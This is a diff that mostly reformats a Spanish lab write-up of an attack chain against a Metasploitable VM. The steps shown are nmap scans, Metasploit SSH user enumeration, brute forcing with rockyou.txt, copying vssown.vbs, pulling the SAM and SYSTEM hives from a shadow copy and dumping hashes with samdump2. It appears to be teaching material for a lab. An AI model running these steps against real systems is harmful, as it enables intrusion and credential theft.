@@ -70,7 +70,7 @@ Resultado:
 ### **B: Escaneo de UDP:** 
 Permite identificar servicios que utilizan el protocolo UDP y que podrían representar posibles puntos de acceso o vulnerabilidades. Este análisis complementa el escaneo TCP y ayuda a obtener una visión más completa de los servicios disponibles en el equipo evaluado.
 
-   nmap -sU 10.0.2.15
+    nmap -sU 10.0.2.15
 
 Resultado:
 ![Im.5.1](/assets/KILL/Im.5.1.png)
@@ -127,9 +127,10 @@ Diccionarios para el laboratorio:
 - Rockyou para Passwords
 
 Diccionarios descargados:
+
 ![Im.10](/assets/KILL/Im.10.png)
 
-En Kali Linux se envian los diccionarios descargados a la ruta: ***<Downloads/diccionarios>*** descomprimir con <**gzip -dk rockyou.txt.gz**> y y luego se corrobora que contenga al usuario <**vagrant**>:
+En **Kali Linux** se envian los diccionarios descargados a la ruta: ***<Downloads/diccionarios>*** descomprimir con <**gzip -dk rockyou.txt.gz**> y y luego se corrobora que contenga al usuario <**vagrant**>:
 
     (user㉿kali)-[~]
      $ cd Downloads/
@@ -144,11 +145,13 @@ En Kali Linux se envian los diccionarios descargados a la ruta: ***<Downloads/di
 Resultado
 ![Im.10.1](/assets/KILL/Im.10.1.png)
 
-Luego **nos aseguramos de que contenga el usuario <vagrant>**.
+Luego **nos aseguramos de que contenga el usuario** **vagrant**.
 Se garantiza que el **password** se encuentra en la lista de diccionarios.
 
 Usuario vagrant con:
+
     cat rockyou.txt | grep vagrant
+
 ![Im.10.2](/assets/KILL/Im.10.2.png)
 
 ## **3.2. Enumeración de Usuarios con Metasploitable**
@@ -157,13 +160,14 @@ Se crean 2 entornos de trabajo, la terminal superior será de **Linux** y la ter
 
 ![Im.11.1](/assets/KILL/Im.11.1.png)
 
-Se inicia Metasploitable con ***<msfconsole -q>***. La carga se visualiza como ***<msf6>***. Asimismo se tiene que cargar las herramientas de escaneo.
+Se inicia Metasploitable con ***<msfconsole -q>***. La carga se visualiza como ***msf6***. Asimismo se tiene que cargar las herramientas de escaneo.
 
      (user㉿kali)-[~/Downloads/diccionarios]
-      $ msfconsole -q
-      msf6>
+     $ msfconsole -q
+     msf6>
 
 Resultado:
+
 ![Im.11.2](/assets/KILL/Im.11.2.png)
 
 Ahora el **Atacante (Kali)** envía "scripts" paquetes SSH de autenticación con una lista de usuarios a la **víctima = "target (Metasploitable)** y este lo recibe. La víctima responde con un mensaje que permite que el Atacante pueda identificar si el usuario que se ha intentado es válido o no.
@@ -174,8 +178,9 @@ Explicación:
 - Ingresando **"show options"** se visualizan todas las opciones de configuración, es decir, para saber que es lo que se tiene que configurar. El módulo **"ssh_enumusers"** tiene parámetros que sirven para configurar el funcionamiento de ese módulo.
 
 Se ingresa: 
-    1. msf6>use auxiliary/scanner/ssh/ssh_enumusers
-    2. msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
+
+    msf6>use auxiliary/scanner/ssh/ssh_enumusers
+    msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
 
 Resultado
 ![Im.11.3](/assets/KILL/Im.11.3.png) 
@@ -205,25 +210,25 @@ En el script de Metasploitable: se ha encontrado el potencial usuario **'vagrant
 
 - Recordar que tenemos que cambiar de módulo **(modulo actual: ssh_enunusers)** para realizar el **<login>**, con el comando **<use auxiliary/scanner/ssh/ssh_login>**.
 
-     1. msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
-     2. msf6 auxiliary(scanner/ssh/ssh_login)>show options
-     3. msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
-     4. msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
-     5. msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
-     6. msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
-     7. msf6 auxiliary(scanner/ssh/ssh_login)>show options
-     8. msf6 auxiliary(scanner/ssh/ssh_login)>run
+    1. msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
+    2. msf6 auxiliary(scanner/ssh/ssh_login)>show options
+    3. msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
+    4. msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
+    5. msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
+    6. msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
+    7. msf6 auxiliary(scanner/ssh/ssh_login)>show options
+    8. msf6 auxiliary(scanner/ssh/ssh_login)>run
 
 - Se realiza el cambio de ruta y a través de 'show options' se observan las configuraciones principales como: 
-    - SET RHOSTS IP de la víctima: *10.0.2.15* 
-    - El username *vagrant*
-    - PASS_FILE: la ruta del archivo con las direcciones
+    - **SET RHOSTS IP** de la víctima: *10.0.2.15* 
+    - El username ***vagrant***
+    - **PASS_FILE:** la ruta del archivo con las direcciones.
 
 Resultado:
 ![Im.12.1](/assets/KILL/Im.12.1.png)
 ![Im.12.2](/assets/KILL/Im.12.2.png)
 
-Se ejecuta y empieza a  realizar la búsqueda del USERNAME 'vagrant':
+Se ejecuta y empieza a  realizar la búsqueda del USERNAME **'vagrant'**:
 ![Im.12.3](/assets/KILL/Im.12.3.png)
 
 ## **ETAPA 4: Explotación y Acceso**
@@ -243,9 +248,9 @@ Desde el lado del adversario (Metasploitable) es necesario comprobar los privile
 
 - Ambos son importantes para hacer la **COPIA** de un archivo en específico y exfiltrarlo/sacarlo hacia afuera (Kali Linux). Asimismo, ambos permiten crear una copia del dico C.
 
-     -sh-4.3$ bash
-     C:\Users\vagrant>whoami
-     C:\Users\vagrant>whoami /priv
+    -sh-4.3$ bash
+    C:\Users\vagrant>whoami
+    C:\Users\vagrant>whoami /priv
 
 Resultado:
 ![Im.13.2](/assets/KILL/Im.13.2.png)
@@ -262,7 +267,7 @@ Luego en la terminal de Kali ingresar el comando siguiente e ingresar la contras
 
      1. scp vssown.vbs vagrant@10.0.2.15:C:\\Users\\vagrant\\Downloads
 
-*NOTA: La máquina víctima (Metasploitable) debe de estar encendida para que se realice la copia.
+*NOTA:** La máquina víctima (Metasploitable) debe de estar encendida para que se realice la copia.
 
 ![Im.14.1](/assets/KILL/Im.14.1.png)
 
@@ -272,7 +277,7 @@ Una manera de verificar la copia es ingresando y buscando en Windows la ruta de 
 
 ![Im.14.2](/assets/KILL/Im.14.2.png)
 
-Se realiza la conexión vía ssh a 'ssh vagrant@10.0.2.15', se ingresa la contraseña 'vagrant' y se invoca al 'bash' para poder entrar a la terminal de Metasploitable.
+Se realiza la conexión vía ssh a **'ssh vagrant@10.0.2.15'**, se ingresa la contraseña ***'vagrant'*** y se invoca al **'bash'** para poder entrar a la terminal de Metasploitable.
 
 ![Im.14.3](/assets/KILL/Im.14.3.png)
 
@@ -291,10 +296,10 @@ Resultado:
 ## **5.3. ¿Qué podemos hacer con el vssown.vbs?**
 Para listar los comandos que el archivo vssown.vbs permite ejecutar, solo debemos ejecutar 'cscript vssown.vbs' en la máquina víctima (Metasploitable). Asimismo, los comandos que vamos a usar son:
 
-/list                             - List current volume shadow copies.
-/start                            - Start the shadow copy service.
-/stop                             - Halt the shadow copy service.
-/status                           - Show status of shadow copy service.
+    /list                             - List current volume shadow copies.
+    /start                            - Start the shadow copy service.
+    /stop                             - Halt the shadow copy service.
+    /status                           - Show status of shadow copy service.
 
 ![Im.14.5](/assets/KILL/Im.14.5.png)
 
@@ -344,10 +349,10 @@ Líneas de comando:
     C:\Windows\Temp>
 
 Y copiar los archivos SAM y SYSTEM del volumen shadow:
-*SAM:
+**SAM:**
     cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM 
 
-*SYSTEM:
+**SYSTEM:**
     cd C:\Windows\Temp>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
 
 **NOTA:** Reemplazar HarddiskVolumeShadowCopyX con el número correspondiente que el script vssown.vbs nos indicó. En este caso 'HarddiskVolumeShadowCopy1'
@@ -373,19 +378,19 @@ Resultado:
 - **samdump2:** Asimismo, permite extraer los hashes de las contraseñas almacenadas en Windows utilizando los archivos SYSTEM y SAM. El archivo SYSTEM contiene la información necesaria para descifrar los datos protegidos del archivo SAM (Security Account Manager), donde se almacenan los hashes de las cuentas de usuario.
 
 En Kali:
-   1. samdump2 SYSTEM SAM > hashes.txt
-   2. samdump2 SYSTEM SAM 
+    1. samdump2 SYSTEM SAM > hashes.txt
+    2. samdump2 SYSTEM SAM 
 
 **NOTA:** Para funcionar, samdump2 requiere dos archivos específicos del registro de Windows: el hive SYSTEM y el hive SAM. El archivo SYSTEM contiene la clave necesaria para descifrar la información almacenada en el archivo SAM (Security Account Manager), que es donde residen los hashes de las contraseñas de los usuarios.
 
-Al ejecutar el comando **<samdump2 SYSTEM SAM > hashes.txt>**, la herramienta procesa ambos archivos, extrae los hashes y guarda el resultado en el archivo ***hashes.txt***. Esta información puede utilizarse posteriormente para realizar análisis de seguridad o auditorías de contraseñas mediante herramientas especializadas.
+Al ejecutar el comando **samdump2 SYSTEM SAM > hashes.txt**, la herramienta procesa ambos archivos, extrae los hashes y guarda el resultado en el archivo ***hashes.txt***. Esta información puede utilizarse posteriormente para realizar análisis de seguridad o auditorías de contraseñas mediante herramientas especializadas.
 
 Resultado:
 ![Im.15.1](/assets/KILL/Im.15.1.png)
 
 
 ## **Reinicio de resultados de John the Ripper**
-Se elimina el archivo ~/.john/john.pot, donde John the Ripper guarda las contraseñas encontradas. Esto permite que las credenciales recuperadas vuelvan a mostrarse durante una nueva ejecución del ataque.
+Se elimina el archivo ***~/.john/john.pot***, donde **John the Ripper guarda las contraseñas encontradas**. Esto permite que las credenciales recuperadas vuelvan a mostrarse durante una nueva ejecución del ataque.
 
     1 (user㉿kali)-[~/Downloads]
     2 $ rm ~/.john/john.pot  
